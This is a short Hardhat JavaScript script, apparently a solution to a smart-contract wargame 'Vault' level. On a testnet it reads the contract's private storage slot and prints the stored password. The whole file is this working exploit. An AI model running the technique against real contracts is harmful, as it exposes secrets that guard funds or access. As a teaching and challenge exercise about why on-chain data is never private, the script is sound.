const { ethers, network, getNamedAccounts, waffle } = require("hardhat");
const { networkConfig } = require("../helper-hardhat-config");

async function attackVault() {
  const chainId = network.config.chainId;
  if (chainId == 4) {
    const provider = waffle.provider;
    const passwordBytes = await provider.getStorageAt(
      networkConfig[chainId]["vault"],
      ethers.BigNumber.from("1")
    );
    const password = ethers.utils.toUtf8String(passwordBytes);
    console.log(`The password is: ${password}`);
  }
}

attackVault()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
